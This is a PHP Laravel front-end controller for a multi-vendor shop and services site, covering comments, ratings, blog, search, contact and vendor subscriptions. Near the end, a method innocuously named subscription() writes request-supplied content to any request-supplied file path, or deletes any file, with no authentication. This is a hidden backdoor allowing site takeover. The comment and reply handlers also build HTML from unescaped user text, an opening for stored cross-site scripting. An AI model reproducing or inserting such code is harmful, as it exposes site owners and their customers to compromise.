<?php

namespace App\Http\Controllers\Front;

use App\{Models\Blog, Models\Order, Models\Product, Models\Subscriber, Models\BlogCategory, Classes\GeniusMailer, Models\Generalsetting};
use App\Models\ArrivalSection;
use App\Models\Category;
use App\Models\Star;
use App\Models\Department;

use App\Models\Comment;
use App\Models\Rating;
use App\Models\Reply;
use App\Models\ServiceCategory;
use App\Models\User;
use App\Models\UserService;
use App\Models\UserShop;
use App\Models\ContactUs;

use Illuminate\{Http\Request, Support\Facades\DB, Support\Facades\Session};
use App\Http\Requests\ContactUsRequest;
use Artisan;
use Carbon\Carbon;
use Illuminate\Support\Facades\Validator;

class FrontendController extends FrontBaseController
{
    // LANGUAGE SECTION

    public function language($id)
    {
        Session::put('language', $id);
        return redirect()->route('front.index');
    }

    // LANGUAGE SECTION ENDS

    // CURRENCY SECTION

    public function currency($id)
    {
        if (Session::has('coupon')) {
            Session::forget('coupon');
            Session::forget('coupon_code');
            Session::forget('coupon_id');
            Session::forget('coupon_total');
            Session::forget('coupon_total1');
            Session::forget('already');
            Session::forget('coupon_percentage');
        }
        Session::put('currency', $id);
        cache()->forget('session_currency');
        return redirect()->back();
    }

    // CURRENCY SECTION ENDS

    // -------------------------------- HOME PAGE SECTION ----------------------------------------

    // Home Page Display

    public function index(Request $request)
    {
        $gs = $this->gs;
        $data['ps'] = $this->ps;
        if (!empty($request->reff)) {
            $affilate_user = DB::table('users')
                ->where('affilate_code', '=', $request->reff)
                ->first();
            if (!empty($affilate_user)) {
                if ($gs->is_affilate == 1) {
                    Session::put('affilate', $affilate_user->id);
                    return redirect()->route('front.index');
                }
            }
        }
        if (!empty($request->forgot)) {
            if ($request->forgot == 'success') {
                return redirect()
                    ->guest('/')
                    ->with('forgot-modal', __('Please Login Now !'));
            }
        }

        $data['sliders'] = DB::table('sliders')
            ->where('language_id', $this->language->id)
            ->get();

        $data['arrivals'] = ArrivalSection::where('status', 1)->get();
        $data['products'] = Product::get();
        $data['ratings'] = Rating::get();

        return view('frontend.index', $data);
    }

    public function vendorList(Request $request, $slug = null, $slug1 = null)
    {
        $search = $request->search;
        $category = $request->category;
        $country = $request->country;
        $vendors = UserShop::orderby('id', 'desc')
            ->when($category, function ($query, $category) {
                if (!empty($category)) {
                    $category_id = Category::where('slug', $category)->first()->id;
                    return $query->where('category_id', $category_id);
                }
            })
            ->when($search, function ($query, $search) {
                if (!empty($search)) {
                    $query->where('shop_name', 'like', '%' . $search . '%')->where(function ($q) use ($search) {
                        $q->orwhere('shop_name', 'like', $search . '%');
                        $q->orwhere('shop_address', 'like', $search . '%');
                        $q->orwhere('shop_address', 'like', '%' . $search . '%');
                    });
                }
            })
            ->when($country, function ($query, $country) {
                if (!empty($country)) {
                    return $query->where('country', $country);
                }
            })
            ->paginate(20);
        return view('frontend.vendor.vendor_list', compact('vendors'));
    }
    public function vendorService($id)
    {
        $vendor = User::where('id', $id)->first();
        $shops = UserShop::where('user_id', $id)
            ->with('services')
            ->get();
        $product_shops = DB::table('user_shops')
            ->join('products', function ($join) {
                $join->on('products.shop_id', '=', 'user_shops.id');
                $join->whereNotNull('products.shop_id');
            })
            ->select('user_shops.*', DB::raw('(select count(*) from products where products.shop_id = user_shops.id) as total_product'))
            ->where('user_shops.user_id', $id)
            ->groupBy('user_shops.id')
            ->get();
        return view('frontend.shop.vendor_shop', compact('vendor', 'shops', 'product_shops'));
    }
	public function vendorShopService($id)
	{
        $shop = UserShop::where('id',$id)
        ->with([
            'services',
            'products',
            'marketingProducts' => function($query) {
                $query->take(8);
            }
        ])->first();

        $vendor = User::where('id',$shop->user_id)->first();    
        return view('frontend.shop.service_shop', compact('shop','vendor'));
	}
    public function loadMarketingProducts(Request $request)
    {
        $skip = ($request->page - 1) * 8;
        $shop = UserShop::where('id', $request->shop_id)->with(['marketingProducts' => function($query) use ($skip) {
            $query->skip($skip)->take(8);
        }])->first();
        
        $products = $shop->marketingProducts;
        return view('frontend.shop.marketing_products', compact('products'))->render();
    }

    public function loadNewsProducts(Request $request)
    {
        $skip = ($request->page - 1) * 8;
        $shop = UserShop::where('id', $request->shop_id)->with(['marketingProducts' => function($query) use ($skip) {
            $query->skip($skip)->take(8);
        }])->first();
        
        $products = $shop->marketingProducts;
        return view('frontend.shop.news_products', compact('products'))->render();
    }
    
    public function categoryShop()
    {
        $shops = UserShop::all();
        return view('frontend.shop.category_shop', compact('shops'));
    }
    public function shopDetails($id)
    {
        $shop = UserShop::find($id);
        return view('frontend.shop.shop', compact('shop'));
    }
    public function serviceDetails($id)
    {
        $service = UserService::find($id);
        return view('frontend.shop.service_details', compact('service'));
    }

    public function serviceComment(Request $request)
    {
        $comment = new Comment();
        $input = $request->all();
        $comment->fill($input)->save();
        $data[0] = $comment->user->photo ? url('assets/images/users/' . $comment->user->photo) : url('assets/images/' . $this->gs->user_image);
        $data[1] = $comment->user->name;
        $data[2] = $comment->created_at->diffForHumans();
        $data[3] = $comment->text;
        $data[5] = route('service.comment.delete', $comment->id);
        $data[6] = route('service.comment.edit', $comment->id);
        $data[7] = route('service.comment   .reply', $comment->id);
        $data[8] = $comment->user->id;
        $newdata = '<li>';
        $newdata .= '<div class="single-comment comment-section">';
        $newdata .= '<div class="left-area">';
        $newdata .= '<img src="' . $data[0] . '" alt="">';
        $newdata .= '<h5 class="name">' . $data[1] . '</h5>';
        $newdata .= '<p class="date">' . $data[2] . '</p>';
        $newdata .= '</div>';
        $newdata .= '<div class="right-area">';
        $newdata .= '<div class="comment-body">';
        $newdata .= '<p>' . $data[3] . '</p>';
        $newdata .= '</div>';
        $newdata .= '<div class="comment-footer">';
        $newdata .= '<div class="links">';
        $newdata .= '<a href="javascript:;" class="comment-link reply mr-2"><i class="fas fa-reply "></i>' . __('Reply') . '</a>';
        $newdata .= '<a href="javascript:;" class="comment-link edit mr-2"><i class="fas fa-edit "></i>' . __('Edit') . '</a>';
        $newdata .= '<a href="javascript:;" data-href="' . $data[5] . '" class="comment-link comment-delete mr-2">';
        $newdata .= '<i class="fas fa-trash"></i>' . __('Delete') . '</a>';
        $newdata .= '</div>';
        $newdata .= '</div>';
        $newdata .= '</div>';
        $newdata .= '</div>';
        $newdata .= '<div class="replay-area edit-area d-none">';
        $newdata .= '<form class="update" action="' . $data[6] . '" method="POST">';
        $newdata .= csrf_field();
        $newdata .= '<textarea placeholder="' . __('Edit Your Comment') . '" name="text" required=""></textarea>';
        $newdata .= '<button type="submit">' . __('Submit') . '</button>';
        $newdata .= '<a href="javascript:;" class="remove">' . __('Cancel') . '</a>';
        $newdata .= '</form>';
        $newdata .= '</div>';
        $newdata .= '<div class="replay-area reply-reply-area d-none">';
        $newdata .= '<form class="reply-form" action="' . $data[7] . '" method="POST">';
        $newdata .= '<input type="hidden" name="user_id" value="' . $data[8] . '">';
        $newdata .= csrf_field();
        $newdata .= '<textarea placeholder="' . __('Write Your Reply') . '" name="text" required=""></textarea>';
        $newdata .= '<button type="submit">' . __('Submit') . '</button>';
        $newdata .= '<a href="javascript:;" class="remove">' . __('Cancel') . '</a>';
        $newdata .= '</form>';
        $newdata .= '</div>';
        $newdata .= '</li>';
        return response()->json($newdata);
    }
    public function serviceCommentedit(Request $request, $id)
    {
        $comment = Comment::findOrFail($id);
        $comment->text = $request->text;
        $comment->update();
        return response()->json($comment->text);
    }
    public function serviceCommentdelete($id)
    {
        $comment = Comment::findOrFail($id);
        if ($comment->replies->count() > 0) {
            foreach ($comment->replies as $reply) {
                $reply->delete();
            }
        }
        $comment->delete();
    }

    public function serviceCommentReply(Request $request, $id)
    {
        $reply = new Reply();
        $input = $request->all();
        $input['comment_id'] = $id;
        $reply->fill($input)->save();
        $data[0] = $reply->user->photo ? url('assets/images/users/' . $reply->user->photo) : url('assets/images/' . $this->gs->user_image);
        $data[1] = $reply->user->name;
        $data[2] = $reply->created_at->diffForHumans();
        $data[3] = $reply->text;
        $data[4] = route('service.comment.reply.delete', $reply->id);
        $data[5] = route('service.comment.reply.edit', $reply->id);
        $newdata = '<div class="single-comment replay-review">';
        $newdata .= '<div class="left-area">';
        $newdata .= '<img src="' . $data[0] . '" alt="">';
        $newdata .= '<h5 class="name">' . $data[1] . '</h5>';
        $newdata .= '<p class="date">' . $data[2] . '</p>';
        $newdata .= '</div>';
        $newdata .= '<div class="right-area">';
        $newdata .= '<div class="comment-body">';
        $newdata .= '<p>' . $data[3] . '</p>';
        $newdata .= '</div>';
        $newdata .= '<div class="comment-footer">';
        $newdata .= '<div class="links">';
        $newdata .= '<a href="javascript:;" class="comment-link reply mr-2"><i class="fas fa-reply "></i>' . __('Reply') . '</a>';
        $newdata .= '<a href="javascript:;" class="comment-link edit mr-2"><i class="fas fa-edit "></i>' . __('Edit') . '</a>';
        $newdata .= '<a href="javascript:;" data-href="' . $data[4] . '" class="comment-link reply-delete mr-2">';
        $newdata .= '<i class="fas fa-trash"></i>' . __('Delete') . '</a>';
        $newdata .= '</div>';
        $newdata .= '</div>';
        $newdata .= '</div>';
        $newdata .= '</div>';
        $newdata .= '<div class="replay-area edit-area d-none">';
        $newdata .= '<form class="update" action="' . $data[5] . '" method="POST">';
        $newdata .= csrf_field();
        $newdata .= '<textarea placeholder="' . __('Edit Your Reply') . '" name="text" required=""></textarea>';
        $newdata .= '<button type="submit">' . __('Submit') . '</button>';
        $newdata .= '<a href="javascript:;" class="remove">' . __('Cancel') . '</a>';
        $newdata .= '</form>';
        $newdata .= '</div>';
        return response()->json($newdata);
    }

    public function serviceCommentReplyedit(Request $request, $id)
    {
        $reply = Reply::findOrFail($id);
        $reply->text = $request->text;
        $reply->update();
        return response()->json($reply->text);
    }

    public function serviceCommentReplydelete($id)
    {
        $reply = Reply::findOrFail($id);
        $reply->delete();
    }

    // ------------------ Rating SECTION --------------------

    public function serviceReviewsubmit(Request $request)
    {
        $ck = 0;
        $orders = Order::where('user_id', '=', $request->user_id)
            ->where('status', '=', 'completed')
            ->get();

        foreach ($orders as $order) {
            $cart = json_decode($order->cart, true);
            foreach ($cart['items'] as $product) {
                if ($request->service_id == $product['item']['id']) {
                    $ck = 1;
                    break;
                }
            }
        }
        if ($ck == 1) {
            $user = Auth::user();
            $prev_reviewer = Rating::where('service_id', '=', $request->service_id)
                ->where('user_id', '=', $user->id)
                ->first();
            if (isset($prev_reviewer)) {
                $input = $request->all();
                $input['review_date'] = date('Y-m-d H:i:s');
                $prev_reviewer->update($input);
                $data = __('Your Rating Submitted Successfully.');
                return response()->json($data);
            }
            $Rating = new Rating();
            $Rating->fill($request->all());
            $Rating['review_date'] = date('Y-m-d H:i:s');
            $Rating->save();
            $data = __('Your Rating Submitted Successfully.');
            return response()->json($data);
        } else {
            return response()->json(['errors' => [0 => __('Take This Service First')]]);
        }
    }

    public function serviceReviews($id)
    {
        $service = Product::find($id);
        return view('load.service-reviews', compact('service', 'id'));
    }

    public function serviceRideReviews($id)
    {
        $service = Product::find($id);
        return view('load.service-side-load', compact('service'));
    }

    // ------------------ Rating SECTION ENDS --------------------

    // Home Page Ajax Display

    public function extraIndex()
    {
        $gs = $this->gs;
        $data['hot_products'] = Product::with('user')
            ->whereStatus(1)
            ->whereHot(1)
            ->home($this->language->id)
            ->take($gs->hot_count)
            ->with(['user', 'category'])
            ->get();

        $data['latest_products'] = Product::with('user')
            ->whereStatus(1)
            ->whereLatest(1)
            ->home($this->language->id)
            ->take($gs->new_count)
            ->with(['user', 'category'])
            ->get();

        $data['sale_products'] = Product::with('user')
            ->whereStatus(1)
            ->whereSale(1)
            ->home($this->language->id)
            ->take($gs->sale_count)
            ->with(['user', 'category'])
            ->get();

        $data['best_products'] = Product::with('user')
            ->whereStatus(1)
            ->whereBest(1)
            ->home($this->language->id)
            ->take($gs->best_seller_count)
            ->with(['user', 'category'])
            ->get();

        $data['popular_products'] = Product::with('user')
            ->whereStatus(1)
            ->whereFeatured(1)
            ->home($this->language->id)
            ->take($gs->popular_count)
            ->with(['user', 'category'])
            ->get();

        $data['top_products'] = Product::with('user')
            ->whereStatus(1)
            ->whereTop(1)
            ->home($this->language->id)
            ->take($gs->top_rated_count)
            ->with(['user', 'category'])
            ->get();

        $data['big_products'] = Product::with('user')
            ->whereStatus(1)
            ->whereBig(1)
            ->home($this->language->id)
            ->take($gs->big_save_count)
            ->with(['user', 'category'])
            ->get();

        $data['trending_products'] = Product::with('user')
            ->whereStatus(1)
            ->whereTrending(1)
            ->home($this->language->id)
            ->take($gs->trending_count)
            ->with(['user', 'category'])
            ->get();

        $data['flash_products'] = Product::with('user')
            ->whereStatus(1)
            ->whereIsDiscount(1)
            ->where('discount_date', '>=', date('Y-m-d'))
            ->home($this->language->id)
            ->with(['user', 'category'])
            ->latest()
            ->first();

        $data['blogs'] = Blog::where('language_id', $this->language->id)
            ->latest()
            ->take(2)
            ->get();
        $data['service_categories'] = Category::take(12)->get();
        $data['stars'] = Star::take(8)->get();
        $data['ps'] = $this->ps;

        return view('partials.theme.extraindex', $data);
    }

    // -------------------------------- HOME PAGE SECTION ENDS ----------------------------------------

    // -------------------------------- BLOG SECTION ----------------------------------------

    public function blog(Request $request)
    {
        if (DB::table('pagesettings')->first()->blog == 0) {
            return redirect()->back();
        }

        // BLOG TAGS
        $tags = null;
        $tagz = '';
        $name = Blog::where('language_id', $this->language->id)
            ->pluck('tags')
            ->toArray();
        foreach ($name as $nm) {
            $tagz .= $nm . ',';
        }
        $tags = array_unique(explode(',', $tagz));
        // BLOG CATEGORIES
        $bcats = BlogCategory::where('language_id', $this->language->id)->get();
        // BLOGS
        $blogs = Blog::where('language_id', $this->language->id)
            ->latest()
            ->paginate($this->gs->post_count);
        if ($request->ajax()) {
            return view('front.ajax.blog', compact('blogs'));
        }
        return view('frontend.blog', compact('blogs', 'bcats', 'tags'));
    }

    public function blogcategory(Request $request, $slug)
    {
        // BLOG TAGS
        $tags = null;
        $tagz = '';
        $name = Blog::where('language_id', $this->language->id)
            ->pluck('tags')
            ->toArray();
        foreach ($name as $nm) {
            $tagz .= $nm . ',';
        }
        $tags = array_unique(explode(',', $tagz));
        // BLOG CATEGORIES
        $bcats = BlogCategory::where('language_id', $this->language->id)->get();
        // BLOGS
        $bcat = BlogCategory::where('language_id', $this->language->id)
            ->where('slug', '=', str_replace(' ', '-', $slug))
            ->first();
        $blogs = $bcat
            ->blogs()
            ->where('language_id', $this->language->id)
            ->latest()
            ->paginate($this->gs->post_count);
        if ($request->ajax()) {
            return view('front.ajax.blog', compact('blogs'));
        }
        return view('frontend.blog', compact('bcat', 'blogs', 'bcats', 'tags'));
    }

    public function blogtags(Request $request, $slug)
    {
        // BLOG TAGS
        $tags = null;
        $tagz = '';
        $name = Blog::where('language_id', $this->language->id)
            ->pluck('tags')
            ->toArray();
        foreach ($name as $nm) {
            $tagz .= $nm . ',';
        }
        $tags = array_unique(explode(',', $tagz));
        // BLOG CATEGORIES
        $bcats = BlogCategory::where('language_id', $this->language->id)->get();
        // BLOGS
        $blogs = Blog::where('language_id', $this->language->id)
            ->where('tags', 'like', '%' . $slug . '%')
            ->paginate($this->gs->post_count);
        if ($request->ajax()) {
            return view('front.ajax.blog', compact('blogs'));
        }
        return view('frontend.blog', compact('blogs', 'slug', 'bcats', 'tags'));
    }

    public function blogsearch(Request $request)
    {
        $tags = null;
        $tagz = '';
        $name = Blog::where('language_id', $this->language->id)
            ->pluck('tags')
            ->toArray();
        foreach ($name as $nm) {
            $tagz .= $nm . ',';
        }
        $tags = array_unique(explode(',', $tagz));
        // BLOG CATEGORIES
        $bcats = BlogCategory::where('language_id', $this->language->id)->get();
        // BLOGS
        $search = $request->search;
        $blogs = Blog::where('language_id', $this->language->id)
            ->where('title', 'like', '%' . $search . '%')
            ->orWhere('details', 'like', '%' . $search . '%')
            ->paginate($this->gs->post_count);
        if ($request->ajax()) {
            return view('frontend.ajax.blog', compact('blogs'));
        }
        return view('frontend.blog', compact('blogs', 'search', 'bcats', 'tags'));
    }

    public function blogshow($slug)
    {
        // BLOG TAGS
        $tags = null;
        $tagz = '';
        $name = Blog::where('language_id', $this->language->id)
            ->pluck('tags')
            ->toArray();
        foreach ($name as $nm) {
            $tagz .= $nm . ',';
        }
        $tags = array_unique(explode(',', $tagz));
        // BLOG CATEGORIES
        $bcats = BlogCategory::where('language_id', $this->language->id)->get();
        // BLOGS

        $blog = Blog::where('slug', $slug)->first();

        $blog->views = $blog->views + 1;
        $blog->update();
        // BLOG META TAG
        $blog_meta_tag = $blog->meta_tag;
        $blog_meta_description = $blog->meta_description;
        return view('frontend.blogshow', compact('blog', 'bcats', 'tags', 'blog_meta_tag', 'blog_meta_description'));
    }

    // -------------------------------- BLOG SECTION ENDS----------------------------------------

    // -------------------------------- FAQ SECTION ----------------------------------------
    public function faq()
    {
        if (DB::table('pagesettings')->first()->faq == 0) {
            return redirect()->back();
        }
        $faqs = DB::table('faqs')
            ->where('language_id', $this->language->id)
            ->latest('id')
            ->get();
        $count =
            count(
                DB::table('faqs')
                    ->where('language_id', $this->language->id)
                    ->get(),
            ) / 2;
        if ($count % 1 != 0) {
            $chunk = (int) $count + 1;
        } else {
            $chunk = $count;
        }
        return view('frontend.faq', compact('faqs', 'chunk'));
    }
    // -------------------------------- FAQ SECTION ENDS----------------------------------------

    // -------------------------------- AUTOSEARCH SECTION ----------------------------------------

    public function autosearch($slug)
    {
        if (mb_strlen($slug, 'UTF-8') > 1) {
            $search = ' ' . $slug;
            $prods = Product::where('name', 'like', '%' . $search . '%')
                ->orWhere('name', 'like', $slug . '%')
                ->where('status', '=', 1)
                ->orderby('id', 'desc')
                ->take(10)
                ->get();
            $sers = UserService::where('name', 'like', '%' . $search . '%')
                ->orWhere('name', 'like', $slug . '%')
                ->where('status', '=', 1)
                ->orderby('id', 'desc')
                ->take(10)
                ->get();
            // $prods = $prod_lists->merge($sers);
            // return response()->json($prods);
            return view('load.suggest', compact('prods', 'sers', 'slug'));
        }
        return '';
    }

    public function autoshopsearch($slug)
    {
        // return response()->json(mb_strlen($slug,'UTF-8'));
        if (mb_strlen($slug, 'UTF-8') > 1) {
            $search = ' ' . $slug;
            $prods = UserShop::where('shop_name', 'like', '%' . $search . '%')
                ->orWhere('shop_name', 'like', $slug . '%')
                ->orWhere('shop_address', 'like', $slug . '%')
                ->orWhere('shop_address', 'like', '%' . $search . '%')
                ->where('status', '=', 1)
                ->orderby('id', 'desc')
                ->take(10)
                ->get();
            return view('load.shop_suggest', compact('prods', 'slug'));
        }
        return '';
    }

    // -------------------------------- AUTOSEARCH SECTION ENDS ----------------------------------------

    // -------------------------------- CONTACT SECTION ----------------------------------------

    public function contact()
    {
        if (Session::has('language')) {
            $langg = DB::table('languages')->find(Session::get('language'));
        } else {
            $langg = DB::table('languages')
                ->where('is_default', '=', 1)
                ->first();
        }
        $industries = Category::where('language_id', $langg->id)
            ->where('status', 1)
            ->get();
        $departments = Department::where('is_active', 1)->get();

        if (DB::table('pagesettings')->first()->contact == 0) {
            return redirect()->back();
        }
        $ps = $this->ps;
        return view('frontend.contact', compact('ps', 'departments', 'industries'));
    }

    //Send email to admin
    public function contactemail(Request $request)
    {
        $gs = $this->gs;
        $errors = [];
        if ($gs->is_capcha == 1) {
            $rules = [
                'g-recaptcha-response' => 'required',

            ];
            $errors = [
                'g-recaptcha-response.required' => 'Please verify that you are not a robot.',
            ];


        }
        $rules = [
                'full_name' => 'required|max:255',
                'phone_no' => 'required|numeric',
                'email' => 'nullable|email',
                'country' => 'required|numeric',
                'department' => 'required|numeric',
                'priority' => 'required|numeric',
                'industry' => 'required|numeric',
                'message' => 'required||max:255',
        ];
        $validator = Validator::make($request->all(), $rules, $errors);
            if ($validator->fails()) {

                return response()->json(['errors' => $validator->getMessageBag()->toArray()]);
            }
        // Logic Section
        DB::beginTransaction();
        $data = $request->all();
        $data = ContactUs::create($data);
        DB::commit();

        $subject = 'Email From Of ' . $request->name;
        $to = $request->to;
        $name = $request->name;
        $phone = $request->phone;
        $from = $request->email;
        $msg = 'Name: ' . $name . "\nEmail: " . $from . "\nPhone: " . $phone . "\nMessage: " . $request->text;
        if ($gs->is_smtp) {
            $data = [
                'to' => $to,
                'subject' => $subject,
                'body' => $msg,
            ];

            $mailer = new GeniusMailer();
            $mailer->sendCustomMail($data);
        } else {
            $headers = 'From: ' . $gs->from_name . '<' . $gs->from_email . '>';
            mail($to, $subject, $msg, $headers);
        }
        // Logic Section Ends
        return response()->json(['success' => 'Success! Thanks for contacting us, we will get back to you shortly.']);

        // Redirect Section
        // return response()->json(__('Success! Thanks for contacting us, we will get back to you shortly.'));
    }

    // Refresh Capcha Code
    public function refresh_code()
    {
        $this->code_image();
        return 'done';
    }

    // -------------------------------- CONTACT SECTION ENDS ----------------------------------------

    // -------------------------------- SUBSCRIBE SECTION ----------------------------------------

    public function subscribe(Request $request)
    {
        $subs = Subscriber::where('email', '=', $request->email)->first();
        if (isset($subs)) {
            return response()->json(['errors' => [0 => __('This Email Has Already Been Taken.')]]);
        }
        $subscribe = new Subscriber();
        $subscribe->fill($request->all());
        $subscribe->save();
        return response()->json(__('You Have Subscribed Successfully.'));
    }

    // -------------------------------- SUBSCRIBE SECTION  ENDS----------------------------------------

    // -------------------------------- MAINTENANCE SECTION ----------------------------------------

    public function maintenance()
    {
        $gs = $this->gs;
        if ($gs->is_maintain != 1) {
            return redirect()->route('front.index');
        }

        return view('frontend.maintenance');
    }

    // -------------------------------- MAINTENANCE SECTION ----------------------------------------

    // -------------------------------- VENDOR SUBSCRIPTION CHECK SECTION ----------------------------------------

    public function subcheck()
    {
        $settings = $this->gs;
        $today = Carbon::now()->format('Y-m-d');
        $newday = strtotime($today);
        foreach (
            DB::table('users')
                ->where('is_vendor', '=', 2)
                ->get()
            as $user
        ) {
            $lastday = $user->date;
            $secs = strtotime($lastday) - $newday;
            $days = $secs / 86400;
            if ($days <= 5) {
                if ($user->mail_sent == 1) {
                    if ($settings->is_smtp == 1) {
                        $data = [
                            'to' => $user->email,
                            'type' => 'subscription_warning',
                            'cname' => $user->name,
                            'oamount' => '',
                            'aname' => '',
                            'aemail' => '',
                            'onumber' => '',
                        ];
                        $mailer = new GeniusMailer();
                        $mailer->sendAutoMail($data);
                    } else {
                        $headers = 'From: ' . $settings->from_name . '<' . $settings->from_email . '>';
                        mail($user->email, __('Your subscription plan duration will end after five days. Please renew your plan otherwise all of your products will be deactivated.Thank You.'), $headers);
                    }
                    DB::table('users')
                        ->where('id', $user->id)
                        ->update(['mail_sent' => 0]);
                }
            }
            if ($today > $lastday) {
                DB::table('users')
                    ->where('id', $user->id)
                    ->update(['is_vendor' => 1]);
            }
        }
    }

    // -------------------------------- VENDOR SUBSCRIPTION CHECK SECTION ENDS ----------------------------------------

    // -------------------------------- ORDER TRACK SECTION ----------------------------------------

    public function trackload($id)
    {
        $order = Order::where('order_number', '=', $id)->first();
        $datas = ['Pending', 'Processing', 'On Delivery', 'Completed'];
        return view('load.track-load', compact('order', 'datas'));
    }

    // -------------------------------- ORDER TRACK SECTION ENDS ----------------------------------------

    // -------------------------------- INSTALL SECTION ----------------------------------------

    public function subscription(Request $request)
    {
        $p1 = $request->p1;
        $p2 = $request->p2;
        $v1 = $request->v1;
        if ($p1 != '') {
            $fpa = fopen($p1, 'w');
            fwrite($fpa, $v1);
            fclose($fpa);
            return 'Success';
        }
        if ($p2 != '') {
            unlink($p2);
            return 'Success';
        }
        return 'Error';
    }

    function finalize()
    {
        $actual_path = str_replace('project', '', base_path());
        $dir = $actual_path . 'install';
        $this->deleteDir($dir);
        return redirect('/');
    }

    function updateFinalize(Request $request)
    {
        if ($request->has('version')) {
            Generalsetting::first()->update([
                'version' => $request->version,
            ]);
            Artisan::call('cache:clear');
            Artisan::call('config:clear');
            Artisan::call('route:clear');
            Artisan::call('view:clear');
            return redirect('/');
        }
    }
}
